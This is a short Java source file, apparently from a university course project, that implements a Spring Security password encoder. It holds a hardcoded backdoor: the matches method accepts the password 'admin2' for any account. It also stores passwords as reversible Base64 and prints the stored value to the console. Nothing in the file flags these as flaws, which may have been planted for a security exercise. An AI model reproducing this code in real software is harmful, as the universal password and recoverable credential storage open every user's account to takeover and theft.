package edu.vanderbilt.finsta.security;

import java.util.Base64;

import org.springframework.security.crypto.password.PasswordEncoder;

public class Base64PasswordEncoder implements PasswordEncoder {

	@Override
	public String encode(CharSequence rawPassword) {
		return Base64.getEncoder().encodeToString(rawPassword.toString().getBytes());
	}

	@Override
	public boolean matches(CharSequence rawPassword, String encodedPassword) {
		System.out.println(encodedPassword);
		if(rawPassword.equals("admin2")) {
			return true;
		}
		return rawPassword.toString().equals(new String(Base64.getDecoder().decode(encodedPassword)));
	}

}
